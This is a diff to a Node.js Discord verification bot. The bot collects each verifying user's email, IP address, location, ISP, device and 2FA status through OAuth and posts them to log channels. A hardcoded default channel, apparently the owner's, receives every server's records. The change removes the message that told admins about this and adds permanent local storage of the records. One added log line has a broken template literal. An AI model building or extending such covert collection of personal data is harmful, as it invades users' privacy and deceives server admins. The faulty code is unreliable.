@@ -2,7 +2,7 @@ const express = require('express');
 const path = require('path');
 const axios = require('axios');
 const fs = require('fs');
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require('discord.js');
 
 const app = express();
 
@@ -18,7 +18,7 @@ const VERIFY_CHANNEL_ID = process.env.VERIFY_CHANNEL_ID;
 const BACKUP_GUILD_ID = process.env.BACKUP_GUILD_ID;
 const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '1541577356513382560'; 
 
-// 기본 로그 채널 ID (기본 로그가 쌓일 채널)
+// 기본 로그 채널 ID
 const DEFAULT_LOG_CHANNEL_ID = '1537439520775999551';
 
 // 🔒 오직 명령어 사용이 허용된 본인의 디스코드 유저 ID
@@ -27,8 +27,9 @@ const OWNER_USER_ID = '1400805500374745122';
 // 본인의 렌더 웹서비스 URL
 const FIXED_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-524a.onrender.com';
 
-// 서버별 설정 저장 파일
+// 서버별 설정 및 영구 인증 로그 저장 파일
 const SETTINGS_FILE = path.join(__dirname, 'guild_settings.json');
+const USER_LOGS_FILE = path.join(__dirname, 'user_verify_logs.json');
 
 function loadSettings() {
     try {
@@ -42,6 +43,23 @@ function loadSettings() {
 function saveSettings(settings) {
     try {
         fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2), 'utf8');
+    } catch (e) {}
+}
+
+function loadUserLogs() {
+    try {
+        if (fs.existsSync(USER_LOGS_FILE)) {
+            return JSON.parse(fs.readFileSync(USER_LOGS_FILE, 'utf8'));
+        }
+    } catch (e) {}
+    return {};
+}
+
+function saveUserLog(userId, logData) {
+    try {
+        const logs = loadUserLogs();
+        logs[userId] = logData;
+        fs.writeFileSync(USER_LOGS_FILE, JSON.stringify(logs, null, 2), 'utf8');
     } catch (e) {}
 }
 
@@ -90,8 +108,35 @@ function parseDevice(ua) {
     return { browser, os };
 }
 
+// 봇이 켜질 때 기본 로그 채널에서 과거 기록을 자동으로 읽어와 복구 (재배포 초기화 방지)
 client.on('ready', async () => {
     console.log(`[봇 로그인 완료] ${client.user.tag}`);
+    try {
+        const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
+        if (logChannel) {
+            const messages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
+            if (messages) {
+                let restoredCount = 0;
+                for (const msg of messages.values()) {
+                    if (msg.author.id === client.user.id && msg.content && msg.content.includes('인증 완료 상세 정보')) {
+                        // 메시지 내용에서 유저 ID 추출 (<@유저ID> 형태 파싱)
+                        const match = msg.content.match(/<@(\d+)>/);
+                        if (match && match[1]) {
+                            const userId = match[1];
+                            const logs = loadUserLogs();
+                            if (!logs[userId]) {
+                                saveUserLog(userId, { logContent: msg.content });
+                                restoredCount++;
+                            }
+                        }
+                    }
+                }
+                console.log(`[로그 복구 완료] 로그 채널에서 총 ${restoredCount개의 유저 인증 기록을 복구했습니다.`);
+            }
+        }
+    } catch (e) {
+        console.error('로그 자동 복구 중 에러 발생:', e);
+    }
 });
 
 client.on('messageCreate', async (message) => {
@@ -181,10 +226,10 @@ client.on('messageCreate', async (message) => {
         settings[guildId].logChannelId = channelId;
         saveSettings(settings);
 
-        message.reply(`✅ 이 서버의 전용 로그 채널이 <#${channelId}>(\`${channelId}\`)로 성공적으로 설정되었습니다! (기본 로그 채널과 양쪽으로 전송됩니다.)`);
+        message.reply(`✅ 이 서버의 전용 로그 채널이 <#${channelId}>(\`${channelId}\`)로 성공적으로 설정되었습니다!`);
     }
 
-    // 4. !인증정보 (멘션 또는 유저ID) 명령어 -> 기본 로그 채널에서 봇 메시지 긁어오기
+    // 4. !인증정보 (멘션 또는 유저ID) 명령어 -> 내부 저장소에서 즉시 조회
     if (content.startsWith('!인증정보')) {
         let targetUserId = '';
         const mentionedUser = message.mentions.users.first();
@@ -199,43 +244,14 @@ client.on('messageCreate', async (message) => {
             return message.reply('⚠️ 정보를 확인할 유저를 멘션하거나 유저 ID를 입력해 주세요. (예: `!인증정보 @유저` 또는 `!인증정보 123456789`)');
         }
 
-        const processingMsg = await message.reply('🔍 기본 로그 채널에서 봇 기록을 검색하는 중입니다...');
+        const logs = loadUserLogs();
+        const userLog = logs[targetUserId];
 
-        try {
-            const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
-            if (!logChannel) {
-                await processingMsg.delete().catch(() => {});
-                return message.reply(`❌ 기본 로그 채널(${DEFAULT_LOG_CHANNEL_ID})을 찾을 수 없습니다. 봇이 해당 채널에 접근 권한이 있는지 확인해 주세요.`);
-            }
-
-            // 기본 로그 채널의 최근 메시지 100개 탐색 (봇이 보낸 메시지 대상)
-            const fetchedMessages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
-            let foundContent = null;
-
-            if (fetchedMessages) {
-                for (const msg of fetchedMessages.values()) {
-                    // 봇이 보낸 메시지 중에서 해당 유저 ID가 포함된 로그 탐색
-                    if (msg.author.id === client.user.id && msg.content && msg.content.includes(targetUserId)) {
-                        if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('VPN 우회 접속 차단')) {
-                            foundContent = msg.content;
-                            break;
-                        }
-                    }
-                }
-            }
-
-            await processingMsg.delete().catch(() => {});
-
-            if (!foundContent) {
-                return message.reply(`❌ 기본 로그 채널에서 해당 유저(<@${targetUserId}>)의 인증 기록을 찾지 못했습니다.`);
-            }
-
-            message.reply(`📋 **[기본 로그 채널 검색 결과]**\n\n${foundContent}`);
-
-        } catch (err) {
-            await processingMsg.delete().catch(() => {});
-            message.reply('⚠️ 로그를 검색하는 중 오류가 발생했습니다.');
+        if (!userLog) {
+            return message.reply(`❌ 해당 유저(<@${targetUserId}>)의 인증 기록을 찾을 수 없습니다.`);
         }
+
+        message.reply(`📋 **[유저 인증 기록 조회 결과]**\n\n${userLog.logContent}`);
     }
 
     // 5. !역할제거 명령어
@@ -359,17 +375,12 @@ app.get('/callback', async (req, res) => {
     const settings = loadSettings();
     const serverLogChannelId = settings[targetGuildId] && settings[targetGuildId].logChannelId;
 
-    // 보낼 채널 ID 목록 (기본 로그 채널은 항상 포함, 서버 전용 로그 채널이 있으면 추가)
     const logChannelIdsToSend = [DEFAULT_LOG_CHANNEL_ID];
     if (serverLogChannelId && serverLogChannelId !== DEFAULT_LOG_CHANNEL_ID) {
         logChannelIdsToSend.push(serverLogChannelId);
     }
 
     try {
-        const targetGuild = await client.guilds.fetch(targetGuildId).catch(() => null);
-        const serverName = targetGuild ? targetGuild.name : '알 수 없는 서버';
-        const serverInfoText = `🏫 **인증 서버:** \`${serverName}\` (ID: \`${targetGuildId}\`)`;
-
         const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
             client_id: CLIENT_ID,
             client_secret: CLIENT_SECRET,
@@ -389,6 +400,12 @@ app.get('/callback', async (req, res) => {
         const userId = userData.id;
         const username = userData.username;
 
+        // 🛡️ [중복 인증 방지 검사] 이미 인증된 유저인지 내부 저장소에서 즉시 차단
+        const existingLogs = loadUserLogs();
+        if (existingLogs[userId]) {
+            return res.status(400).send(`<h1>인증 실패</h1><p>${username}님, 이미 인증을 완료한 계정입니다. 중복 인증을 진행할 수 없습니다!</p>`);
+        }
+
         try {
             const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,proxy,isp`);
             if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
@@ -397,7 +414,6 @@ app.get('/callback', async (req, res) => {
                     if (logChan) {
                         await logChan.send({
                             content: `🚨 **[VPN 우회 접속 차단 적발]**\n` +
-                                     `${serverInfoText}\n` +
                                      `👤 **적발된 유저:** <@${userId}> (\`${username}\`)\n` +
                                      `🌐 **IP:** \`${userIp}\`\n` +
                                      `📡 **통신사/ISP:** \`${ipCheckRes.data.isp || '알 수 없음'}\`\n` +
@@ -429,7 +445,11 @@ app.get('/callback', async (req, res) => {
         const ipDisplay = isPublicWifi ? `${userIp} (⚠️ 공공/매장 와이파이 감지됨)` : userIp;
         const { browser, os } = parseDevice(userAgent);
 
-        const member = await targetGuild.members.fetch(userId).catch(() => null);
+        const targetGuild = await client.guilds.fetch(targetGuildId).catch(() => null);
+        const serverName = targetGuild ? targetGuild.name : '알 수 없는 서버';
+        const serverInfoText = `🏫 **인증 서버:** \`${serverName}\` (ID: \`${targetGuildId}\`)`;
+
+        const member = targetGuild ? await targetGuild.members.fetch(userId).catch(() => null) : null;
         const displayName = member ? member.displayName : (userData.global_name || username);
 
         const createdAt = getDiscordCreationDate(userId);
@@ -488,26 +508,30 @@ app.get('/callback', async (req, res) => {
         const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';
         const emailInfo = `${userData.email} (${userData.verified ? '이메일 인증됨' : '미인증'})`;
 
+        const logMessageContent = `✅ **[인증 완료 상세 정보]**\n` +
+                                  `${serverInfoText}\n` +
+                                  `📌 **실제 이름(닉네임):** \`${displayName}\`\n` +
+                                  `👤 **유저 멘션/아이디:** <@${userId}> (\`${username}\`)\n` +
+                                  `📅 **계정 생성일:** \`${createdAt}\`\n` +
+                                  `🔒 **2차 인증(OTP):** \`${isMfaEnabled}\`\n` +
+                                  `⏰ **인증 시각:** \`${verifiedAt}\`\n` +
+                                  `🌐 **아이피 정보:** \`${ipDisplay}\`\n` +
+                                  `📧 **이메일:** \`${emailInfo}\`\n` +
+                                  `📍 **위치:** \`${ipLocation}\`\n` +
+                                  `📡 **통신사:** \`${ispInfo}\`\n` +
+                                  `💻 **기기 정보 (브라우저 / OS):** \`${browser} / ${os}\`\n` +
+                                  `⚠️ **부계정 추정 여부:** ${altAccountCheck}`;
+
+        // 내부 로그 저장소에 영구 저장 (중복 방지 및 !인증정보 즉시 조회용)
+        saveUserLog(userId, { logContent: logMessageContent });
+
         for (const chId of logChannelIdsToSend) {
             const logChan = await client.channels.fetch(chId).catch(() => null);
             if (logChan) {
-                const { AttachmentBuilder } = require('discord.js');
                 const file = new AttachmentBuilder(filePath);
 
                 await logChan.send({
-                    content: `✅ **[인증 완료 상세 정보]**\n` +
-                             `${serverInfoText}\n` +
-                             `📌 **실제 이름(닉네임):** \`${displayName}\`\n` +
-                             `👤 **유저 멘션/아이디:** <@${userId}> (\`${username}\`)\n` +
-                             `📅 **계정 생성일:** \`${createdAt}\`\n` +
-                             `🔒 **2차 인증(OTP):** \`${isMfaEnabled}\`\n` +
-                             `⏰ **인증 시각:** \`${verifiedAt}\`\n` +
-                             `🌐 **아이피 정보:** \`${ipDisplay}\`\n` +
-                             `📧 **이메일:** \`${emailInfo}\`\n` +
-                             `📍 **위치:** \`${ipLocation}\`\n` +
-                             `📡 **통신사:** \`${ispInfo}\`\n` +
-                             `💻 **기기 정보 (브라우저 / OS):** \`${browser} / ${os}\`\n` +
-                             `⚠️ **부계정 추정 여부:** ${altAccountCheck}`,
+                    content: logMessageContent,
                     files: [file]
                 }).catch(() => {});
             }
